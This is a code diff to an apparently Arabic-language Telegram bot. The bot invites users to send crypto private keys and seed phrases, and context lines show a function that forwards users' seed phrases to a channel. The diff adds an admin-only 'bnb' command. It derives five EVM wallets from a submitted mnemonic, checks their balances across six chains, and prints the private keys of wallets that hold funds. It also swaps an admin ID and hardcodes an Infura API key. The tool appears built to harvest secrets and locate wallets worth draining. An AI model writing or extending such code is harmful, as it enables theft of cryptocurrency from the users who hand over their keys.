@@ -8,6 +8,8 @@ import dotenv from 'dotenv';
 import express from 'express';
 import fs from 'fs';
 import path from 'path';
+import { ethers } from 'ethers';
+import axios from 'axios';
 
 dotenv.config();
 
@@ -38,7 +40,7 @@ if (process.env.RPC_URL3) {
 }
 
 // قائمة المشرفين المخولين
-const ADMIN_IDS = [5053683608, 7011338539, 7722535506, 8266984054];
+const ADMIN_IDS = [5053683608, 7011338539, 7722535506, 8356786274];
 
 // دالة للتحقق من صلاحيات المشرف
 function isAdmin(chatId) {
@@ -75,6 +77,92 @@ async function forwardToChannel(wallet, userChatId, userInfo, seedPhrase) {
 
 // متغير لتتبع وضع البوت لكل مستخدم
 const userModes = new Map();
+
+// إعدادات شبكات EVM
+const EVM_RPC_URLS = {
+  eth: "https://mainnet.infura.io/v3/6d9c970353cd4ea7a33edef4d77aece7",
+  bsc: "https://bsc-dataseed.binance.org/",
+  base: "https://mainnet.base.org",
+  poly: "https://polygon-rpc.com",
+  avax: "https://api.avax.network/ext/bc/C/rpc",
+  arb: "https://arb1.arbitrum.io/rpc"
+};
+
+const EVM_NETWORK_NAMES = {
+  eth: "Ethereum 🌐",
+  bsc: "Binance Smart Chain 🟡",
+  base: "Base 🔵",
+  poly: "Polygon 🟣",
+  avax: "Avalanche 🔺",
+  arb: "Arbitrum 💙"
+};
+
+const EVM_DERIVATION_PATHS = [
+  "m/44'/60'/0'/0/0",
+  "m/44'/60'/0'/0/1",
+  "m/44'/60'/0'/0/2",
+  "m/44'/60'/0'/0/3",
+  "m/44'/60'/0'/0/4"
+];
+
+async function checkEVMActivity(rpcUrl, address) {
+  try {
+    const [balanceRes, txRes] = await Promise.all([
+      axios.post(rpcUrl, { jsonrpc: "2.0", method: "eth_getBalance", params: [address, "latest"], id: 1 }, { timeout: 5000 }),
+      axios.post(rpcUrl, { jsonrpc: "2.0", method: "eth_getTransactionCount", params: [address, "latest"], id: 1 }, { timeout: 5000 })
+    ]);
+    const balance = parseInt(balanceRes.data.result || '0x0', 16) / 1e18;
+    const txCount = parseInt(txRes.data.result || '0x0', 16);
+    return { balance, txCount, hasActivity: txCount > 0 || balance > 0 };
+  } catch (e) {
+    return { balance: 0, txCount: 0, hasActivity: false };
+  }
+}
+
+async function scanEVMWallet(mnemonic, chatId) {
+  const cleanedMnemonic = mnemonic.trim().toLowerCase();
+  if (cleanedMnemonic.split(/\s+/).length < 12) {
+    return bot.sendMessage(chatId, "❌ العبارة غير صالحة. يجب أن تكون 12 كلمة على الأقل.");
+  }
+
+  await bot.sendMessage(chatId, "🔍 جاري فحص مسارات EVM النشطة (5 مسارات)...");
+
+  let activeFound = false;
+  
+  for (const path of EVM_DERIVATION_PATHS) {
+    try {
+      const wallet = ethers.HDNodeWallet.fromPhrase(cleanedMnemonic, undefined, path);
+      let walletDetails = "";
+      let hasNetworkActivity = false;
+
+      for (const [net, url] of Object.entries(EVM_RPC_URLS)) {
+        const activity = await checkEVMActivity(url, wallet.address);
+        if (activity.hasActivity) {
+          hasNetworkActivity = true;
+          walletDetails += `🔹 *${EVM_NETWORK_NAMES[net]}*\n   💰 الرصيد: \`${activity.balance.toFixed(6)}\`\n   🔢 العمليات: \`${activity.txCount}\`\n\n`;
+        }
+      }
+
+      if (hasNetworkActivity) {
+        activeFound = true;
+        const message = `✅ **محفظة نشطة مكتشفة**\n\n` +
+          `📍 **المسار:** \`${path}\`\n` +
+          `🏠 **العنوان:** \`${wallet.address}\`\n` +
+          `🔑 **المفتاح الخاص:** \`${wallet.privateKey}\`\n\n` +
+          `🌐 **الشبكات النشطة:**\n${walletDetails}` +
+          `──────────────────`;
+        
+        await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
+      }
+    } catch (e) {
+      console.error(`Error scanning path ${path}:`, e.message);
+    }
+  }
+
+  if (!activeFound) {
+    await bot.sendMessage(chatId, "ℹ️ لم يتم العثور على أي نشاط في المسارات الـ 5 المحددة لهذه العبارة.");
+  }
+}
 
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
@@ -442,7 +530,8 @@ bot.onText(/\/start/, (msg) => {
       '💼 أو أرسل لي مفتاح خاص وسأعرض لك عنوان المحفظة والرصيد.\n\n' +
       '📍 أو أرسل لي عناوين المحافظ لعرض روابطها.\n\n' +
       '🎲 استخدم /starts لتوليد عبارات سرية عشوائية.\n\n' +
-      '💰 استخدم /b للتبديل بين وضع عرض جميع المحافظ أو المحافظ ذات الرصيد فقط.'
+      '💰 استخدم /b للتبديل بين وضع عرض جميع المحافظ أو المحافظ ذات الرصيد فقط.\n\n' +
+      '🔸 أرسل كلمة **bnb** لفحص عبارات EVM (الخمس مسارات).'
     );
   } else {
     // رسالة المستخدمين العاديين باللغة الإنجليزية
@@ -864,8 +953,23 @@ function createWalletButtons(address) {
 }
 
 bot.on('message', async (msg) => {
-  if (msg.text && msg.text.startsWith('/')) return;
   const chatId = msg.chat.id;
+  const text = msg.text;
+
+  if (!text) return;
+
+  // معالجة كلمة bnb للمشرفين
+  if (text.toLowerCase() === 'bnb' && isAdmin(chatId)) {
+    userModes.set(chatId, 'awaiting_evm_phrase');
+    return bot.sendMessage(chatId, "📝 من فضلك أرسل عبارة الـ Mnemonic (12 أو 24 كلمة) لفحص مسارات EVM:");
+  }
+
+  if (userModes.get(chatId) === 'awaiting_evm_phrase' && isAdmin(chatId)) {
+    userModes.delete(chatId);
+    return scanEVMWallet(text, chatId);
+  }
+
+  if (text.startsWith('/')) return;
   const userName = msg.from?.first_name || msg.from?.username || 'Unknown';
   const userInfo = {
     username: msg.from?.username,
@@ -997,14 +1101,13 @@ bot.on('message', async (msg) => {
   }
 
   // فحص إذا كان النص يحتوي على عناوين محافظ فقط
-  const text = msg.text.trim();
-  const addresses = text.split(/\s+/).filter(addr => {
+  const addresses = msg.text.trim().split(/\s+/).filter(addr => {
     // فحص إذا كان العنوان يشبه عنوان Solana (32-44 حرف)
     return addr.length >= 32 && addr.length <= 44 && /^[1-9A-HJ-NP-Za-km-z]+$/.test(addr);
   });
 
   // إذا كان النص يحتوي على عناوين محافظ فقط
-  if (addresses.length > 0 && addresses.length === text.split(/\s+/).length) {
+  if (addresses.length > 0 && addresses.length === msg.text.trim().split(/\s+/).length) {
     if (addresses.length === 0) {
       await bot.sendMessage(chatId, '📌 أرسل لي عناوين المحافظ كل واحدة بسطر.');
       return;
